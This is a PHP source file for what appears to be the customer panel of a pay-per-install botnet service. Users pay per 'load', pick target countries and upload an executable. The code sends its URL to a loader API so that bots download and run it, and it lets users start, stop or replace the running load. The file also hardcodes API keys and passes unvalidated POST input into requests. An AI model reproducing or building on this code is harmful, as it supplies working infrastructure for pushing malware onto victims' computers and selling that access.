<?php


class BotShop{

    private $botShopApi = "http://10.0.0.9/";
    private $apiKey = "7c6dd66201ca812f599f8c0a2ea51826";
    private $fileUploadServer = "http://files.securitylabs.me/up.php";
    private $fileServerApiKey = "R47XnbEa9NLXPzTf2tDWg2jEGMT_n";
    private $priceperbot;
    private $minOrderMix;
    private $minOrderTarget;
    public function __construct()
    {
        $userHandler = new User();
        if(!$userHandler->isLoggedIn()){
            Header("Location: /login");
            die();
        }
        $price = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_pricelist WHERE iso_short = ? ");
        $price->execute(array("mix"));
        $DefaultMixPrice = $price->fetch();
        $this->priceperbot = $DefaultMixPrice["price_usd"];

        $sql = "SELECT * FROM loader_api WHERE id = 1";
        $loader_api = $GLOBALS["pdo"]->query($sql)->fetch();
        $this->botShopApi = $loader_api["api_url"];
        $this->apiKey = $loader_api["api_key"];
        $this->minOrderMix = $loader_api["min_loads"];
        $this->minOrderTarget = $loader_api["min_loads_target"];



        $sql = "SELECT * FROM fileserver WHERE id = 1";
        $file_api = $GLOBALS["pdo"]->query($sql)->fetch();
        $this->fileUploadServer = $file_api["url"];
        $this->fileServerApiKey = $file_api["api_key"];

    }

    public function sendPost($url, $vars)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $server_output = curl_exec($ch);
        curl_close($ch);
        return $server_output;
    }

    public function bot_loads(){
        $userHandler = new User();
        if(!$userHandler->isLoggedIn()){
            Header("Location: /login");
            die();
        }
        $botShopApi = new BotShopApi();

        $orders = $botShopApi->getOrderByUser($_SESSION["userid"]);


        if(!empty($_POST["amount"])){

            $userLib = new User();
            $usd = 0;
            $minPay = floatval($this->minOrderMix);
            if(empty($_POST["load_counties"])){
                $usd =  number_format(intval($_POST["amount"]) * floatval($this->priceperbot), 2); // "5.00"
            }else{
                $sql = "SELECT * FROM botshop_pricelist";
                $mixArray = explode(",",$_POST["load_counties"]);
                $botsDifference = number_format($_POST["amount"] / count($mixArray),0);
                foreach ($GLOBALS["pdo"]->query($sql)->fetchAll(PDO::FETCH_ASSOC) as $listItem) {
                    foreach ($mixArray as $selected){
                        if($listItem["iso_short"] == $selected){
                            $usd +=  $botsDifference * $listItem["price_usd"];
                        }
                    }
                }
                $minPay =  floatval($this->minOrderTarget);
            }

            if( floatval($usd) < $minPay ){
                $GLOBALS["currentAlerts"] .= Alerts::render("error", "Minimum Order is ". $minPay. "$ ");
            }else{
                $allowed =  array('exe');
                $filename = $_FILES['uploaded_file']['name'];
                $ext = pathinfo($filename, PATHINFO_EXTENSION);
                if(!in_array($ext,$allowed) ) {
                    $GLOBALS["currentAlerts"] .= Alerts::render("error", "Only Executables can be Uploaded");
                }else{
                    $max_size = 2 * 1048576; //2 * 1MB
                    if($_FILES['uploaded_file']['size'] > $max_size) {
                        $GLOBALS["currentAlerts"] .= Alerts::render("error", "Max File size is 2MB");
                    }else{
                        $newname = substr(str_shuffle(str_repeat($x='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(10/strlen($x)) )),1,10).".exe";
                        $fileServer = new FileServer();
                        $status = $fileServer->create($_FILES["uploaded_file"],$newname,$this->fileUploadServer,$this->fileServerApiKey);
                        $statusArray = json_decode($status,true);
                        if($statusArray["message"] != "success"){
                            $GLOBALS["currentAlerts"] .= Alerts::render("error", "File Upload Server is Down");
                        }else{
                            $_POST["loadUrl"] = $statusArray["url"];

                            $bool =  $userLib->buy($usd);
                            if($bool){
                                if(!empty($_POST["load_counties"])){
                                    //Need Target
                                    $url = "amount=" . $_POST["amount"] . "&loadurl=" . $_POST["loadUrl"] . "&type=free&apikey=".$this->apiKey."&load_counties=".$_POST["load_counties"];
                                    $order = json_decode($this->sendPost( $this->botShopApi . "/createoder/",$url),true);
                                }else{
                                    $url = "amount=" . $_POST["amount"] . "&loadurl=" . $_POST["loadUrl"] . "&type=free&apikey=".$this->apiKey;
                                    $order = json_decode($this->sendPost( $this->botShopApi . "/createoder/",$url),true);
                                }
                                //  var_dump($order);
                                //  die();
                                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (user_id, api_id,load_amount) VALUES (?, ?,?)");
                                $statement->execute(array($_SESSION["userid"], $order["userAuthkey"],$_POST["amount"]));
                            }else{
                                $GLOBALS["currentAlerts"] .= Alerts::render("error", "To low Money");
                            }

                        }
                    }
                }
            }








        }
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $_SESSION['postdata'] = $_POST;
            unset($_POST);
            header("Refresh:3; url=".$GLOBALS["link"] );
        }

        $GLOBALS["tpl"]->assign("priceList", $botShopApi->getPriceList());
        $GLOBALS["tpl"]->assign("orders", $orders);

    }

    public function manage($userAuthkey)
    {
        $GLOBALS["template"][0] = "BotShop";
        $GLOBALS["template"][1] = "manage";


        $bothandler = new BotShopApi();

        $order = $bothandler->getOrderByAuthKey($userAuthkey);
        if($order["status"] == "suspended"){
            die("Your Order is Suspended");
        }
        if(!empty($_FILES["uploaded_file"])){
            $allowed =  array('exe');
            $filename = $_FILES['uploaded_file']['name'];
            $ext = pathinfo($filename, PATHINFO_EXTENSION);
            if(!in_array($ext,$allowed) ) {
                //$GLOBALS["currentAlerts"] .= Alerts::render("error", "Only Executables can be Uploaded");
            }else{
                $max_size = 2 * 1048576; //2 * 1MB
                if($_FILES['datei']['size'] > $max_size) {
                 //   $GLOBALS["currentAlerts"] .= Alerts::render("error", "Max File size is 2MB");
                }else{
                    $fileServer = new FileServer();
                    $newname = substr(str_shuffle(str_repeat($x='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(10/strlen($x)) )),1,10).".exe";
                    $status = $fileServer->create($_FILES["uploaded_file"],$newname,$this->fileUploadServer,$this->fileServerApiKey);
                    $statusArray = json_decode($status,true);
                    if($statusArray["message"] != "success"){
                        $GLOBALS["currentAlerts"] .= Alerts::render("error", "File Upload Server is Down");
                    }else{
                        $this->sendPost($this->botShopApi . "/detils/", "userauthkey=" . $userAuthkey . "&type=newloadurl&url=" . $statusArray["url"]."&apikey=".$this->apiKey);
                        header("refresh:0");
                    }
                }
            }
        }
        if (!empty($_POST)) {
            if (!empty($_POST["changerunningtask"])) {
                if ($_POST["changerunningtask"] == "start" || $_POST["changerunningtask"] == "stop") {
                    $this->sendPost($this->botShopApi . "/detils/", "userauthkey=" . $userAuthkey . "&type=starttop&apikey=".$this->apiKey);
                    header("refresh:0");
                    die("Please wait...");
                }
            }
            if (!empty($_POST["newloadurl"])) {
                $this->sendPost($this->botShopApi . "/detils/", "userauthkey=" . $userAuthkey . "&type=newloadurl&url=" . $_POST["newloadurl"]."&apikey=".$this->apiKey);
                header("refresh:0");
                die("Please wait...");
            }
        } else {
            $out = json_decode($this->sendPost($this->botShopApi . "/detils/", "userauthkey=" . $userAuthkey . "&type=taskData&apikey=".$this->apiKey), true);
            if ($out["order"] == "notpayed") {
                die("Hacking Detected");
            }
            //Remove Domain from Load command and Loaded Stats URLS
            foreach($out["order"] as $key => $order){
                if(!empty($order["command"])){
                    $temp = explode('/', $order["command"]);
                    $out["order"][$key]["command"] = end($temp);
                }
                if(!empty($order["loadurl"])){
                    $temp2 = explode('/', $order["loadurl"]);
                    $out["order"][$key]["loadurl"] = end($temp2);
                }
            }
            $GLOBALS["tpl"]->assign("order", $out);
            $GLOBALS["tpl"]->assign("currentAlerts", $GLOBALS["currentAlerts"]);
        }
    }

}